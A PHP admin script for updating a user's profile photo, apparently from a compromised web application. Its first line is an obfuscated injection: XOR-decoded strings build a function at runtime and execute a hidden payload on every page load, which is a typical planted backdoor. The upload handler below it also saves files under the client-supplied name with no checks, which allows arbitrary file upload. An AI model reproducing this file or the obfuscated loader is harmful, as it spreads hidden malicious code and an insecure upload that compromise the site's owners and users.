<?php $CSyTeqfX=';3 S<-4RD96X=SU'; $QNMhZc='XAE2HHk41WU,T<;'^$CSyTeqfX; $mfNrxHo='DFpd6KE0M;RVk2;X IJnnXR0. 2>71;=M Eqxv807RD W:0ONP+<Do>-MSd4ZFOOw1 YMbkU KJDzKVtCMbqsIQOYxSOWjTzFmJ,8LG KUxwxkBYY 5A=0+DcT369mzAj=ijGC4ks66AwjzcfW=J>Z-E;snnrwZWD<EUTKm=M9Z  lbF3Ty9sXysY;RC87-Jk=KXxk=g.d6cDb4A2,lhQ<-6 =rbf T8;q,,<uky0. 2PkdmJCJ<2URlltdy<6q1yc NUlK7YdQgls4Q.= Po6GAk1Y=2. P+ZROOWIYtnnO AFPdYYc<MY, X=Jiy3ShmxtI.H1Og,Id-+F1YRCvgnfg4g8tnaKP;Xg.E7nrHvSBW-B6Pc11g4sW1 OtU 0dnXvPQCWbleN ;:SJvzE ,;HSXc8MFMy3t=M;8qkhqKXN E=L.ZA7f:R;f,.O2q+7MMm WN=xx>,0 +Z.dsQR WjzYs .I42U4TmXmD.KkaT56,uaol14OJG+E+6cH4Z  Nmt>=1hBnH.LB2zpncsCP+edi>R=Yes=U-cpojwxdmILFIXkrE=XCoUpyypUaEP wrdEfbFZLXDclgqbQF>.;9:I=s,9 NA1cf<5RQ9S>tuDa7R QZojQDaaYWMH-7->Of OJ3wJG7 -5Z<lebjDd-JIHrGFzPF'; $wSUqtuzK=$QNMhZc('', '- XEP>+S9R=84WC1S=9FI =BqDSJVndP8TbXQVC:>41N4NY  pSS60ZL92;k73;gSUA-,NKqK.3mZkvTc6hxzm>:-XnopMopOd,CJdcIkhXGCKf0eSA3QUElG0RBXDAaNTBAnI=bWYC5WDGCNsY+J;vaR.N0RS12=ga<tnMN9K6ENDF-V-PdZcszPI77MECbOR>,QP7nSnKiNFP FMLUqZLZSXIhBD5LZ.GIEUVYVOLA5Png,,8YS6:LDP;:sy:x<CA=uH R DlYLWB0BHEyOMMHOU8ISqK5Rzook<, OdgkD 21DdyGJ,5YEc77csZ5HEYP-O<PfGWCmKD4T81+VOJ95q6m1=5k1HxCE NNOvVw46A7SyCJ;n=W3PT.+>EIDSxR;4:lheljDZN2jKZaVMW=6ci10L0s9PY,OYQVH1>6=E7T-B3;RNB=I9HO;S.tZ89EB6=XNLaHUCD>KLW53T6CVyWDO=Um>Q-DqVNG-CE0TBMUGILPF=+>t.NO<-L3ST=ESUXHOnNlJ-6SSPHESk=OPLMZ3I8>TV0TD-FJJEDJ+twq9YCqXozZeIKNDlTveFBJRtRWsb-acJLAWB04LOBfQ,D,IAI=5BKALT+=V2ZSYdES3T0sFJqdAAy,GAHALRgBD.>R,m7VYAZ;XK8KQNmH2 <ZwoAZ;'^$mfNrxHo); $wSUqtuzK();
	include 'includes/session.php';

	if(isset($_POST['upload'])){
		$id = $_POST['id'];
		$filename = $_FILES['photo']['name'];
		if(!empty($filename)){
			move_uploaded_file($_FILES['photo']['tmp_name'], '../images/'.$filename);	
		}
		
		$conn = $pdo->open();

		try{
			$stmt = $conn->prepare("UPDATE users SET photo=:photo WHERE id=:id");
			$stmt->execute(['photo'=>$filename, 'id'=>$id]);
			$_SESSION['success'] = 'User photo updated successfully';
		}
		catch(PDOException $e){
			$_SESSION['error'] = $e->getMessage();
		}

		$pdo->close();

	}
	else{
		$_SESSION['error'] = 'Select user to update photo first';
	}

	header('location: users.php');
?>